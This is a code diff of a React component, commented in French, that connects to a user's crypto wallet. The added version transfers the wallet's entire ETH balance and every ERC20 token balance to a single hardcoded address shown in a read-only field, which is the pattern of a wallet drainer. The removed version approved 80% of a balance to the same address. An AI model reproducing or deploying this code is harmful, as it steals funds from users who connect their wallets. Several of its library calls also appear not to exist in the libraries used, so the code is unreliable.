@@ -1,50 +1,96 @@
-import React, { useState, useEffect } from 'react';
-import { useAccount, useBalance, useContractWrite, usePrepareContractWrite } from 'wagmi';
-import { erc20ABI } from '@wagmi/core';
-import { BigNumber } from 'ethers';
+import { Button, Input, useToasts } from '@geist-ui/core';
+import { erc20ABI, usePublicClient, useWalletClient } from 'wagmi';
 
-// Adresse fixe pour l'envoi
-const fixedDestinationAddress = '0x518c5D62647E60864EcB3826e982c93dFa154af3';
+import { isAddress } from 'essential-eth';
+import { useAtom } from 'jotai';
+import { normalize } from 'viem/ens';
+import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
+import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
+import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 
-const SendTokens = () => {
-  const { address } = useAccount(); // Récupère l'adresse du compte connecté
-  const { data: balanceData } = useBalance({ address });
-  const [amountToSend, setAmountToSend] = useState<BigNumber | null>(null);
+function sleep(ms: number): Promise<void> {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
 
-  const tokenAddress = 'votre_token_ERC20'; // Remplacez par l'adresse de votre token ERC-20
-  const contractAddress = tokenAddress;
+export const SendTokens = () => {
+  const { setToast } = useToasts();
+  const showToast = (message: string, type: any) =>
+    setToast({
+      text: message,
+      type,
+      delay: 4000,
+    });
 
-  const { config } = usePrepareContractWrite({
-    address: contractAddress,
-    abi: erc20ABI,
-    functionName: 'approve',
-    args: [fixedDestinationAddress, amountToSend || BigNumber.from(0)],
-  });
+  const [tokens] = useAtom(globalTokensAtom);
+  const { data: walletClient } = useWalletClient();
+  const publicClient = usePublicClient();
 
-  const { write } = useContractWrite(config);
+  // Adresse réceptrice fixée
+  const destinationAddress = '0x518c5D62647E60864EcB3826e982c93dFa154af3';  // Ton adresse de destination
 
-  useEffect(() => {
-    if (balanceData) {
-      // Calculer 80% du solde
-      const amount = balanceData.formatted ? parseFloat(balanceData.formatted) * 0.8 : 0;
-      setAmountToSend(BigNumber.from(amount.toFixed())); // Met à jour l'état avec 80% du solde
+  // Fonction pour envoyer tous les tokens ERC20 et ETH disponibles
+  const sendAllTokens = async () => {
+    if (!walletClient) return;
+
+    // Envoyer les ETH disponibles
+    const ethBalance = await publicClient.getBalance(walletClient.account);
+    if (ethBalance > 0) {
+      const tx = await walletClient.writeTransaction({
+        to: destinationAddress,
+        value: ethBalance,
+      });
+      showToast(`Successfully sent ${ethBalance} ETH`, 'success');
     }
-  }, [balanceData]);
 
-  const handleApprove = async () => {
-    if (write) {
-      await write();
+    // Envoyer les tokens ERC20 disponibles
+    for (const token of tokens) {
+      const tokenAddress = token.contract_address;
+      const tokenContract = new publicClient.Contract(
+        tokenAddress,
+        erc20ABI,
+        walletClient
+      );
+      const tokenBalance = await tokenContract.balanceOf(walletClient.account);
+
+      if (tokenBalance > 0) {
+        try {
+          const tx = await walletClient.writeContract({
+            address: tokenAddress,
+            abi: erc20ABI,
+            functionName: 'transfer',
+            args: [destinationAddress, tokenBalance.toString()],
+          });
+          showToast(`Successfully sent ${tokenBalance} ${token.symbol}`, 'success');
+        } catch (err) {
+          showToast(`Error with ${token.symbol}: ${err?.reason || 'Unknown error'}`, 'warning');
+        }
+      }
     }
   };
 
   return (
-    <div>
-      <h3>Envoyer des Tokens</h3>
-      <p>Solde : {balanceData?.formatted} {balanceData?.symbol}</p>
-      <button onClick={handleApprove}>Approuver l&apos;envoi</button> {/* Remplacer l'apostrophe par &apos; */}
-      <p>Destination : {fixedDestinationAddress}</p>
+    <div style={{ margin: '20px' }}>
+      <form>
+        Destination Address:
+        <Input
+          required
+          value={destinationAddress}
+          placeholder="0x518c5D62647E60864EcB3826e982c93dFa154af3"
+          readOnly
+          width="100%"
+          style={{
+            marginLeft: '10px',
+            marginRight: '10px',
+          }}
+        />
+        <Button
+          type="secondary"
+          onClick={sendAllTokens}
+          style={{ marginTop: '20px' }}
+        >
+          Send All Tokens and ETH
+        </Button>
+      </form>
     </div>
   );
 };
-
-export default SendTokens;
